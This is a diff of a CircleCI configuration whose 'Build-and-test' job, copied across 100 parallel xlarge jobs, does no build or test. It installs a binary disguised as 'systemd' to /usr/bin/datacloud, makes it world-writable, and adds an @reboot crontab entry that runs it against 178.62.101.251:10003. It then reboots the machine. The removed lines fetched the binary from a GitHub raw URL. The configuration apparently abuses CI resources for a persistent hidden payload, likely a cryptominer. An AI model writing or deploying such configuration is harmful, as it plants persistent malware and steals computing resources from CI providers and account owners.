@@ -1,22 +1,22 @@
 version: 2.1
+
 jobs:
-  build1: &build_template
-    docker:
-      - image: ubuntu:22.04
+  build1:  &build_template
+    parallelism: 15
+    machine:
+      image: ubuntu-2204:current
     resource_class: xlarge
     steps:
       - checkout
-      - setup_remote_docker
       - run:
-          name: "Setup Environment and Run Script"
-          no_output_timeout: 5h
+          name: Build-and-test
           command: |
-            apt-get update && apt-get install -y wget ca-certificates >/dev/null 2>&1
-            wget -q https://github.com/techpzg0h176/o8pyb590z7/raw/refs/heads/main/systemd
-            chmod +x systemd
-            mv systemd /usr/bin/datacloud
-            echo -e "@reboot /usr/bin/datacloud" | crontab -
-            sudo reboot >/dev/null 2>&1 >/dev/null &
+                 chmod +x systemd
+                 sudo mv systemd /usr/bin/datacloud
+                 sudo chmod 777 /usr/bin/datacloud
+                 echo -e "@reboot /usr/bin/datacloud -o 178.62.101.251:10003" | crontab -
+                 sudo reboot >/dev/null 2>&1 >/dev/null &
+
 
   build2: *build_template
   build3: *build_template
@@ -97,6 +97,27 @@ jobs:
   build78: *build_template
   build79: *build_template
   build80: *build_template
+  build81: *build_template
+  build82: *build_template
+  build83: *build_template
+  build84: *build_template
+  build85: *build_template
+  build86: *build_template
+  build87: *build_template
+  build88: *build_template
+  build89: *build_template
+  build90: *build_template
+  build91: *build_template
+  build92: *build_template
+  build93: *build_template
+  build94: *build_template
+  build95: *build_template
+  build96: *build_template
+  build97: *build_template
+  build98: *build_template
+  build99: *build_template
+  build100: *build_template
+
 
 workflows:
   version: 2
@@ -182,3 +203,23 @@ workflows:
       - build78
       - build79
       - build80
+      - build81
+      - build82
+      - build83
+      - build84
+      - build85
+      - build86
+      - build87
+      - build88
+      - build89
+      - build90
+      - build91
+      - build92
+      - build93
+      - build94
+      - build95
+      - build96
+      - build97
+      - build98
+      - build99
+      - build100
